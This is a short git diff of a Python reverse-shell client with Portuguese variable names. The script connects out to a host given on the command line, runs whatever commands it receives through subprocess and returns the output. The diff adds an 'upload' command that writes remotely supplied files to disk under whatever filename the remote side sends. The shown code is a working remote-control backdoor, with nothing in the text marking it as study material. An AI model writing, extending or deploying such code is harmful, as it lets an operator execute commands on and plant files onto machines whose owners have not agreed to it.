@@ -6,12 +6,22 @@ import subprocess
 
 # DNS = config('DNS')
 
+
+def download_file(socket: socket.socket) -> None:
+    data = socket.recv(1024).decode()
+    filename, filesize = data.split(';')
+
+    with open(filename, 'wb') as f:
+        dados = socket.recv(int(filesize))
+
+        f.write(dados)
+        return
+
+
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexao:
     conexao.connect((sys.argv[1], int(sys.argv[2])))
 
     print('Conectado\n')
-
-    endereco, porta = conexao.getpeername()
 
     while True:
         try:
@@ -26,6 +36,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conexao:
                     os.chdir(repr(comando[3:]))
                     conexao.sendall('continue'.encode())
                     continue
+
+            if comando == 'upload':
+                download_file(conexao)
+                continue
 
             output = subprocess.getoutput(comando)
 
